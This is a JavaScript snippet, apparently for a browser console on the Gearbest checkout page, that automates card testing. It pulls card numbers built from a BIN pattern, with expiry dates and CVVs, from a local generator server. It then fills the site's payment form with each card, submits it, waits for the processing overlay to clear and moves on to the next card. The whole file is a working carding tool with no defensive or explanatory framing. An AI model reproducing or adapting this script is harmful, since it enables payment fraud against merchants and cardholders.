var url = "http://localhost:5000/bin?bin=4060320348xxxx11&mon=0&year=0&cvv=271&can=10";
var iteration = null;
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i];
	    sessionStorage.card = JSON.stringify( json );
	    $($(".inputBox.inputBox.mr10.fl")[0]).val(json.card);
	    $("#expiryDateMM").val(json.mon);
        $("#expiryDateYY").val(json.year);
	    $(".securityCode").val(json.cvv);
	    $("#js_upFormBtn").click();

	    setTimeout(function(){
	    	var interval = setInterval(function() {
		        console.log("Procesando...")
		        if ( !$("#js_mask").length ) {
		        	console.log("Probemos la proxima");
		        	clearInterval(interval);
		        	setTimeout(iteration, 1000);
		    	}
		    }, 1000);
	    }, 3000);

	  }
	  else {
	    $.ajax({
              url:url,
              dataType: "jsonp"
            });
	  }

	  i++;
	}

	iteration();
};
// Gearbest
$.ajax({
     url:url,
     dataType: "jsonp"
});